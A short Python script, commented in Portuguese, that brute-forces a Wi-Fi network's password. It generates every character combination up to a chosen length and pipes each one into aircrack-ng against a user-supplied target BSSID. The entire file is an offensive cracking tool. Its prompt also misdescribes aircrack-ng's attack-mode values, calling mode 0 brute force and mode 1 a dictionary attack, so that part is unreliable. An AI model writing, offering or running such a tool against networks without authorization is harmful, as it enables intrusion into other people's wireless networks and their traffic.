import itertools
import subprocess
import threading
import time

def gerar_combinacoes(caracteres, tamanho_maximo):
    # Adiciona letras maiúsculas, minúsculas e números de 0 a 9 aos caracteres
    caracteres += "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

    for tamanho in range(1, tamanho_maximo + 1):
        for combinacao in itertools.product(caracteres, repeat=tamanho):
            yield "".join(combinacao)

def gerar_e_testar_dicionario(opcoes, modo_ataque, bssid, caracteres, tamanho_maximo):
    try:
        # Adiciona o modo de ataque e o BSSID
        opcoes.extend(["-a", modo_ataque, "-b", bssid])

        # Executa o comando aircrack-ng com as opções fornecidas e gera dinamicamente as combinações
        p = subprocess.Popen(['aircrack-ng'] + opcoes, stdin=subprocess.PIPE, text=True)
        
        for combinacao in gerar_combinacoes(caracteres, tamanho_maximo):
            p.stdin.write(combinacao + "\n")
            p.stdin.flush()
            time.sleep(0.1)  # Aguarda um curto período para evitar sobrecarregar o processo

        p.stdin.close()

        # Aguarda o término do processo
        p.wait()
    except Exception as e:
        print("Ocorreu um erro:", e)

if __name__ == "__main__":
    # Solicita ao usuário que forneça opções para o aircrack-ng
    opcoes = input("Digite as opções para o aircrack-ng: ").split()

    # Solicita ao usuário que forneça o modo de ataque desejado
    modo_ataque = input("Digite o modo de ataque (0 = força bruta, 1 = ataque de dicionário): ")

    # Solicita ao usuário que forneça o BSSID da rede alvo
    bssid = input("Digite o BSSID da rede alvo: ")

    # Define os caracteres e o tamanho máximo para as combinações
    caracteres = input("Digite os caracteres para o dicionário: ")
    tamanho_maximo = int(input("Digite o tamanho máximo para as combinações: "))

    # Inicia uma thread para gerar e testar o dicionário em tempo real
    t = threading.Thread(target=gerar_e_testar_dicionario, args=(opcoes, modo_ataque, bssid, caracteres, tamanho_maximo))
    t.start()

    # Aguarda a thread terminar
    t.join()
